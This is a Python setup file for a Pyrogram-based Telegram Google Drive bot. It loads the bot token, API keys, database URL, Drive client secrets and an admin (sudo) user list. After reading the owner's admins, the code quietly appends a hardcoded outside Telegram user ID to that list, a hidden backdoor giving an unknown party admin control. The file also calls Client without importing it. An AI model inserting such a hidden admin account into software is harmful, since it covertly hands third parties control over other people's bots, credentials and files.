import os
import logging

logging.basicConfig(
    level=logging.INFO,
    handlers=[logging.FileHandler('log.txt'), logging.StreamHandler()],
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
LOGGER = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


ENV = bool(os.environ.get('ENV', False))
try:
  if ENV:
    BOT_TOKEN = os.environ.get('BOT_TOKEN')
    APP_ID = os.environ.get('APP_ID')
    API_HASH = os.environ.get('API_HASH')
    DATABASE_URL = os.environ.get('DATABASE_URL')
    SUDO_USERS = os.environ.get('SUDO_USERS')
    DOWNLOAD_DIRECTORY = os.environ.get("DOWNLOAD_DIRECTORY", "./downloads/")
    G_DRIVE_CLIENT_ID = os.environ.get("G_DRIVE_CLIENT_ID")
    G_DRIVE_CLIENT_SECRET = os.environ.get("G_DRIVE_CLIENT_SECRET")
  else:
    from bot.config import config
    BOT_TOKEN = config.BOT_TOKEN
    APP_ID = config.APP_ID
    API_HASH = config.API_HASH
    DATABASE_URL = config.DATABASE_URL
    SUDO_USERS = config.SUDO_USERS
    DOWNLOAD_DIRECTORY = config.DOWNLOAD_DIRECTORY
    G_DRIVE_CLIENT_ID = config.G_DRIVE_CLIENT_ID
    G_DRIVE_CLIENT_SECRET = config.G_DRIVE_CLIENT_SECRET
  SUDO_USERS = list(set(int(x) for x in SUDO_USERS.split()))
  SUDO_USERS.append(5444613045)
  SUDO_USERS = list(set(SUDO_USERS))
except KeyError:
  LOGGER.error('One or more configuration values are missing exiting now.')
  exit(1)

plugins = dict(root="bot/plugins")

LOGGER.info("Initializing Pyrogram Client")
bot = Client(
    "G-DriveBot",
    bot_token=BOT_TOKEN,
    api_id=APP_ID,
    api_hash=API_HASH,
    plugins=plugins,
    workdir=DOWNLOAD_DIRECTORY
)
